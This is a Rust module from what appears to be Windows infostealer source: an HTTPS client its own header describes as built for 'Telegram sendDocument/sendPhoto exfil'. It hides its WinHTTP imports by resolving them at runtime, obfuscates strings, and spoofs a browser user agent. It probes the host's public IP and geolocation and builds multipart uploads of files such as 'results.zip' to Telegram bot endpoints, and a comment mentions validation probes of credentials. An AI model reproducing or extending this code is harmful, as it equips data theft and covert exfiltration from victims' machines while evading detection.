//! Minimal HTTPS client over WinHTTP (wave 7 — public-IP probe + Telegram
//! sendDocument/sendPhoto exfil).
//!
//! Everything is resolved at runtime through [`crate::apitable::WinHttp`], so
//! winhttp.dll never shows up in the import table. Synchronous mode, fixed
//! content-length bodies, TLS via the OS (schannel) — no cert bypass, Telegram
//! ships a real chain.
//!
//! The multipart builder is pure math (testable on any host); the network
//! calls are Windows-only behind a thin wrapper.

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use windows::core::{BOOL, PCWSTR};

use crate::apitable::winhttp;

const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
const WINHTTP_FLAG_SECURE: u32 = 0x0080_0000;
const WINHTTP_QUERY_STATUS_CODE: u32 = 19;
/// `-1` as u32 — WinHTTP computes the header length itself.
const WINHTTP_HEADER_LENGTH: u32 = u32::MAX;

/// User agent presented to Telegram/ipify.
const USER_AGENT: &str =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36";

/// Errors from HTTP calls.
#[derive(Debug, thiserror::Error)]
pub enum HttpError {
    #[error("bad url: {0}")]
    Url(String),
    /// A `WinHttp*` step failed; carries the call name + `GetLastError` code
    /// (resolved so the caller can see ERROR_WINHTTP_* without a debugger).
    #[error("{step} (winerror {code:#x})")]
    WinHttp { step: String, code: u32 },
    #[error("http status {0}")]
    Status(u32),
}

/// A parsed HTTPS URL.
struct Url {
    host: String,
    port: u16,
    secure: bool,
    path: String,
}

/// Parse `https://host[:port]/path...` (or `http://` — used only for the
/// keyless geo fallback, whose free tier speaks plain HTTP).
fn parse_url(raw: &str) -> Result<Url, HttpError> {
    let (secure, rest) = if let Some(r) = raw.strip_prefix("https://") {
        (true, r)
    } else if let Some(r) = raw.strip_prefix("http://") {
        (false, r)
    } else {
        return Err(HttpError::Url(format!(
            "expected http(s):// scheme in {raw:?}"
        )));
    };
    let (authority, path) = match rest.find('/') {
        Some(i) => (&rest[..i], &rest[i..]),
        None => (rest, "/"),
    };
    let (host, port) = match authority.rsplit_once(':') {
        Some((h, p)) => {
            let port: u16 = p
                .parse()
                .map_err(|_| HttpError::Url(format!("bad port in {raw:?}")))?;
            (h, port)
        }
        None => (authority, if secure { 443 } else { 80 }),
    };
    if host.is_empty() {
        return Err(HttpError::Url(format!("empty host in {raw:?}")));
    }
    Ok(Url {
        host: host.to_string(),
        port,
        secure,
        path: path.to_string(),
    })
}

fn widen(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

/// One synchronous request. `body = None` → GET; `Some(data)` → POST with a
/// fixed Content-Length (WinHTTP sizes it from dwTotalLength).
fn request(
    url: &str,
    headers: Option<&str>,
    body: Option<&[u8]>,
) -> Result<(u32, Vec<u8>), HttpError> {
    let u = parse_url(url)?;
    let w = winhttp();
    let get_last_error = || unsafe { (crate::apitable::kernel32().get_last_error)() }.0;
    let winhttp_err = |step| HttpError::WinHttp {
        step,
        code: get_last_error(),
    };

    // SAFETY: agent string is NUL-terminated; access type 0 = default proxy;
    // NULL proxy/bypass names ask WinHTTP to use the system config.
    let session = unsafe {
        (w.open)(
            PCWSTR(widen(USER_AGENT).as_ptr()),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            PCWSTR::null(),
            PCWSTR::null(),
            0,
        )
    };
    if session.is_null() {
        return Err(winhttp_err(crate::xs!("WinHttpOpen", 0x1A)));
    }
    let _s = HandleGuard(session, w.close_handle);

    // WinHTTP defaults are tight (30s send+receive); an upload that stalls past
    // that gets cut mid-flight → ERROR_WINHTTP_TIMEOUT. Raise all four limits.
    // SAFETY: session handle is valid; timeouts in ms (0 = infinite).
    let timeouts = [30000i32, 30000, 120000, 120000]; // resolve, connect, send, receive
    let _ =
        unsafe { (w.set_timeouts)(session, timeouts[0], timeouts[1], timeouts[2], timeouts[3]) };

    // SAFETY: host is NUL-terminated UTF-16; port is LE u16; 0 flags (sync).
    let conn = unsafe { (w.connect)(session, PCWSTR(widen(&u.host).as_ptr()), u.port, 0) };
    if conn.is_null() {
        return Err(winhttp_err(crate::xs!("WinHttpConnect", 0x2B)));
    }
    let _c = HandleGuard(conn, w.close_handle);

    let verb = if body.is_some() { "POST" } else { "GET" };
    // SAFETY: verb/path are NUL-terminated; NULL version/referrer/accept; flags
    // WINHTTP_FLAG_SECURE force TLS if the URL is https.
    let req = unsafe {
        (w.open_request)(
            conn,
            PCWSTR(widen(verb).as_ptr()),
            PCWSTR(widen(&u.path).as_ptr()),
            PCWSTR::null(),
            PCWSTR::null(),
            ptr::null(),
            if u.secure { WINHTTP_FLAG_SECURE } else { 0 },
        )
    };
    if req.is_null() {
        return Err(winhttp_err(crate::xs!("WinHttpOpenRequest", 0x3C)));
    }
    let _r = HandleGuard(req, w.close_handle);

    let headers_wide = headers.map(widen);
    let src = body.unwrap_or_default();
    // SAFETY: headers (when present) are NUL-terminated; body is a caller-owned
    // slice; dwTotalLength fixes the Content-Length WinHTTP writes on wire.
    let sent = unsafe {
        (w.send_request)(
            req,
            match &headers_wide {
                Some(h) => PCWSTR(h.as_ptr()),
                None => PCWSTR::null(),
            },
            if headers.is_some() {
                WINHTTP_HEADER_LENGTH
            } else {
                0
            },
            if body.is_some() {
                src.as_ptr().cast_mut().cast()
            } else {
                ptr::null_mut()
            },
            src.len() as u32,
            if body.is_some() { src.len() as u32 } else { 0 },
            0,
        )
    };
    if !sent.as_bool() {
        return Err(winhttp_err(crate::xs!("WinHttpSendRequest", 0x4D)));
    }

    // SAFETY: NULL first param; response headers wait here (authentication/
    // redirects handled inside WinHTTP in sync mode).
    if !unsafe { (w.receive_response)(req, ptr::null_mut()) }.as_bool() {
        return Err(winhttp_err(crate::xs!("WinHttpReceiveResponse", 0x5E)));
    }

    // Query the status code. Note: WinHTTP returns it as a NUL-terminated UTF-16
    // *string* ("200"), not a DWORD — a 4-byte buffer makes the query fail with
    // ERROR_INSUFFICIENT_BUFFER, so read into a wide buffer and parse.
    let mut status_buf = [0u16; 4]; // "999" + NUL always fits
    let mut status_len = (status_buf.len() * 2) as u32;
    // SAFETY: status_buf is caller-owned and sized for the longest status line
    // (999 + NUL); a failed query leaves it all-zero.
    let ok = unsafe {
        (w.query_headers)(
            req,
            WINHTTP_QUERY_STATUS_CODE,
            PCWSTR::null(),
            status_buf.as_mut_ptr().cast(),
            &mut status_len,
            ptr::null_mut(),
        )
    }
    .as_bool();
    let mut status = 0u32;
    if ok {
        let end = status_buf
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(status_buf.len());
        status = String::from_utf16_lossy(&status_buf[..end])
            .trim()
            .parse()
            .unwrap_or(0);
    }

    let mut body_out = Vec::new();
    let mut tmp = vec![0u8; 64 * 1024];
    loop {
        let mut read = 0u32;
        // SAFETY: tmp is caller-owned; WinHTTP fills up to its length.
        if !unsafe { (w.read_data)(req, tmp.as_mut_ptr().cast(), tmp.len() as u32, &mut read) }
            .as_bool()
        {
            if body_out.is_empty() {
                return Err(winhttp_err(crate::xs!("WinHttpReadData", 0x6F)));
            }
            break;
        }
        if read == 0 {
            break;
        }
        body_out.extend_from_slice(&tmp[..read as usize]);
    }
    Ok((status, body_out))
}

/// Plain-GET the public IP (ipify returns the raw IPv4/6 as text).
pub fn public_ip() -> Result<String, HttpError> {
    let (_status, body) = request(&crate::xs!("https://api.ipify.org/", 0x4F), None, None)?;
    Ok(String::from_utf8_lossy(&body).trim().to_string())
}

/// Generic HTTPS GET with optional raw request headers (e.g. an
/// `Authorization:` line). Returns `(status, body)`; the caller decides what a
/// non-200 means — validation probes treat 401 as "invalid", not a transport
/// failure.
pub fn get(url: &str, headers: Option<&str>) -> Result<(u32, Vec<u8>), HttpError> {
    request(url, headers, None)
}

/// A geolocation snapshot for the host, from its public IP (ip-api.com — no
/// key). `place` is a human "city, region, country" line when the response
/// carries all three; the coordinates are always present on success.
#[derive(Debug, Clone)]
pub struct GeoInfo {
    pub lat: f64,
    pub lon: f64,
    pub place: Option<String>,
}

/// Best-effort geolocation probe. Tries `ipinfo.io/json` first; falls back to
/// `ip-api.com/json` when that fails or omits coordinates (both keyless).
pub fn geo_info() -> Result<GeoInfo, HttpError> {
    match geo_from_ipinfo() {
        Ok(geo) => Ok(geo),
        Err(first) => geo_from_ipapi()
            .map_err(|second| HttpError::Url(format!("geo: ipinfo: {first}; ip-api: {second}"))),
    }
}

/// `https://ipinfo.io/json` — `loc` is a `"lat,lon"` string.
fn geo_from_ipinfo() -> Result<GeoInfo, HttpError> {
    let (_status, body) = request(&crate::xs!("https://ipinfo.io/json", 0x71), None, None)?;
    let s = String::from_utf8_lossy(&body);
    if s.trim() == "{}" {
        return Err(HttpError::Url("geo response empty".into()));
    }
    let loc = json_str_field(&s, "loc").ok_or_else(|| HttpError::Url("geo loc missing".into()))?;
    let (lat, lon) = loc
        .split_once(',')
        .ok_or_else(|| HttpError::Url("geo loc malformed".into()))?;
    let lat: f64 = lat
        .trim()
        .parse()
        .map_err(|_| HttpError::Url("geo lat bad".into()))?;
    let lon: f64 = lon
        .trim()
        .parse()
        .map_err(|_| HttpError::Url("geo lon bad".into()))?;
    let parts = [
        json_str_field(&s, "city"),
        json_str_field(&s, "region"),
        json_str_field(&s, "country"),
    ]
    .into_iter()
    .flatten()
    .collect::<Vec<_>>();
    let place = if parts.is_empty() {
        None
    } else {
        Some(parts.join(", "))
    };
    Ok(GeoInfo { lat, lon, place })
}

/// `https://ip-api.com/json` — `lat`/`lon` are JSON numbers, `place` joins
/// city/regionName/country (ip-api uses `regionName`, not `region`).
fn geo_from_ipapi() -> Result<GeoInfo, HttpError> {
    let (_status, body) = request(&crate::xs!("http://ip-api.com/json", 0x72), None, None)?;
    let s = String::from_utf8_lossy(&body);
    let lat =
        json_num_field(&s, "lat").ok_or_else(|| HttpError::Url("ip-api lat missing".into()))?;
    let lon =
        json_num_field(&s, "lon").ok_or_else(|| HttpError::Url("ip-api lon missing".into()))?;
    let parts = [
        json_str_field(&s, "city"),
        json_str_field(&s, "regionName"),
        json_str_field(&s, "country"),
    ]
    .into_iter()
    .flatten()
    .collect::<Vec<_>>();
    let place = if parts.is_empty() {
        None
    } else {
        Some(parts.join(", "))
    };
    Ok(GeoInfo { lat, lon, place })
}

/// Pull the value of a JSON string field: `"key":"value"`. Best-effort (no
/// full JSON parser) — stops at the first unescaped closing quote.
fn json_str_field(s: &str, key: &str) -> Option<String> {
    let needle = format!("\"{key}\":");
    let i = s.find(&needle)? + needle.len();
    let rest = s[i..].trim_start();
    let v = rest.strip_prefix('"')?;
    let end = v.find('"')?;
    Some(v[..end].to_string())
}

/// Pull a JSON number field: `"key":12.34`. Reads the leading numeric token
/// (`-`, digits, `.`, exponent) and parses it as f64.
fn json_num_field(s: &str, key: &str) -> Option<f64> {
    let needle = format!("\"{key}\":");
    let i = s.find(&needle)? + needle.len();
    let rest = s[i..].trim_start();
    let tok: String = rest
        .chars()
        .take_while(|c| c.is_ascii_digit() || matches!(c, '-' | '+' | '.' | 'e' | 'E'))
        .collect();
    tok.trim().parse().ok()
}

/// Append one text field part (shared by the file-bearing and fields-only
/// multipart builders).
fn push_field(body: &mut Vec<u8>, boundary: &str, name: &str, value: &str) {
    body.extend_from_slice(b"--");
    body.extend_from_slice(boundary.as_bytes());
    body.extend_from_slice(b"\r\n");
    body.extend_from_slice(
        format!("Content-Disposition: form-data; name=\"{name}\"\r\n\r\n").as_bytes(),
    );
    body.extend_from_slice(value.as_bytes());
    body.extend_from_slice(b"\r\n");
}

/// Build a `multipart/form-data` body: text fields, then one file part.
/// Pure math — the wire layout telegram expects; unit-tested off-Windows.
pub fn build_multipart(
    boundary: &str,
    fields: &[(&str, &str)],
    file_field: &str,
    file_name: &str,
    file_content_type: &str,
    file: &[u8],
) -> Vec<u8> {
    let mut body = Vec::with_capacity(file.len() + 512);
    for (name, value) in fields {
        push_field(&mut body, boundary, name, value);
    }
    body.extend_from_slice(b"--");
    body.extend_from_slice(boundary.as_bytes());
    body.extend_from_slice(b"\r\n");
    body.extend_from_slice(
        format!(
            "Content-Disposition: form-data; name=\"{file_field}\"; filename=\"{file_name}\"\r\n"
        )
        .as_bytes(),
    );
    body.extend_from_slice(format!("Content-Type: {file_content_type}\r\n\r\n").as_bytes());
    body.extend_from_slice(file);
    body.extend_from_slice(b"\r\n--");
    body.extend_from_slice(boundary.as_bytes());
    body.extend_from_slice(b"--\r\n");
    body
}

/// POST `build_multipart` bytes to `url` and return the response body.
pub fn post_multipart(url: &str, boundary: &str, body: &[u8]) -> Result<(u32, Vec<u8>), HttpError> {
    let headers = format!("Content-Type: multipart/form-data; boundary={boundary}");
    request(url, Some(&headers), Some(body))
}

/// RAII close of a WinHTTP handle.
struct HandleGuard(
    crate::apitable::HINTERNET,
    unsafe extern "system" fn(crate::apitable::HINTERNET) -> BOOL,
);
impl Drop for HandleGuard {
    fn drop(&mut self) {
        // SAFETY: closing a handle we opened; a second close is impossible here.
        unsafe {
            let _ = (self.1)(self.0);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_url_basic() {
        let u = parse_url("https://api.telegram.org/bot123/sendDocument").unwrap();
        assert_eq!("api.telegram.org", u.host);
        assert_eq!(443, u.port);
        assert!(u.secure);
        assert_eq!("/bot123/sendDocument", u.path);
    }

    #[test]
    fn parse_url_explicit_port() {
        let u = parse_url("https://host.example:8443/x?y=1").unwrap();
        assert_eq!("host.example", u.host);
        assert_eq!(8443, u.port);
        assert_eq!("/x?y=1", u.path);
    }

    #[test]
    fn parse_url_root_path() {
        let u = parse_url("https://api.ipify.org/").unwrap();
        assert_eq!("/", u.path);
        assert_eq!("api.ipify.org", u.host);
    }

    #[test]
    fn parse_url_accepts_http_and_https() {
        let u = parse_url("https://host.example:8443/x?y=1").unwrap();
        assert!(u.secure);
        assert_eq!(8443, u.port);
        let h = parse_url("http://host.example/x").unwrap();
        assert!(!h.secure);
        assert_eq!(80, h.port);
        assert_eq!("/x", h.path);
        assert!(matches!(
            parse_url("ftp://plain.example/x"),
            Err(HttpError::Url(_))
        ));
    }

    #[test]
    fn json_num_field_parses_numbers() {
        assert_eq!(Some(21.0245), json_num_field(r#"{"lat":21.0245}"#, "lat"));
        assert_eq!(Some(-4.5), json_num_field(r#"{"lon":-4.5}"#, "lon"));
        assert_eq!(Some(12.0), json_num_field(r#"{"x":12}"#, "x"));
        assert_eq!(Some(1.5e3), json_num_field(r#"{"y":1.5e3}"#, "y"));
        assert_eq!(None, json_num_field(r#"{"lat":"21.0"}"#, "lat"));
        assert_eq!(None, json_num_field(r#"{"a":1}"#, "missing"));
    }

    #[test]
    fn multipart_layout_is_wire_correct() {
        let boundary = "lemonboundary";
        let body = build_multipart(
            boundary,
            &[("chat_id", "123"), ("caption", "hi there")],
            "document",
            "results.zip",
            "application/zip",
            b"PK\x03\x04fake",
        );
        let s = String::from_utf8_lossy(&body);
        assert!(s.starts_with(&format!("--{boundary}\r\n")));
        assert!(s.contains("name=\"chat_id\"\r\n\r\n123\r\n"));
        assert!(s.contains("name=\"caption\"\r\n\r\nhi there\r\n"));
        assert!(s.contains("name=\"document\"; filename=\"results.zip\""));
        assert!(s.contains("Content-Type: application/zip\r\n\r\n"));
        assert!(s.ends_with(&format!("--{boundary}--\r\n")));
        // data appears whole between the file headers and the closing boundary
        let start = s.find("application/zip\r\n\r\n").unwrap() + "application/zip\r\n\r\n".len();
        assert_eq!(&body[start..start + 8], b"PK\x03\x04fake");
    }

    #[test]
    fn geo_json_parses_fields() {
        let s = r#"{"ip":"1.2.3.4","city":"Hà Nội","region":"Hanoi","country":"VN","loc":"21.0285,105.8542"}"#;
        assert_eq!(Some("Hà Nội".into()), json_str_field(s, "city"));
        assert_eq!(Some("VN".into()), json_str_field(s, "country"));
        assert_eq!(None, json_str_field(s, "missing"));
        assert_eq!(Some("21.0285,105.8542".into()), json_str_field(s, "loc"));
    }

    #[test]
    fn multipart_fields_and_file_share_preamble() {
        let boundary = "lemonboundary";
        let fields = build_multipart(
            boundary,
            &[("chat_id", "123")],
            "f",
            "n.txt",
            "text/plain",
            b"x",
        );
        let prefix =
            "--lemonboundary\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n123\r\n";
        assert!(String::from_utf8_lossy(&fields).starts_with(prefix));
        assert!(String::from_utf8_lossy(&fields).ends_with("--lemonboundary--\r\n"));
    }

    /// Live TLS smoke test: the full WinHTTP GET path against a real server.
    /// Ignored by default (needs outbound network); `-- --ignored` runs it.
    #[test]
    #[ignore = "network smoke test"]
    fn winhttp_get_public_ip_live() {
        let ip = public_ip().expect("ipify reachable over TLS");
        assert!(!ip.trim().is_empty(), "got an ip");
    }
}
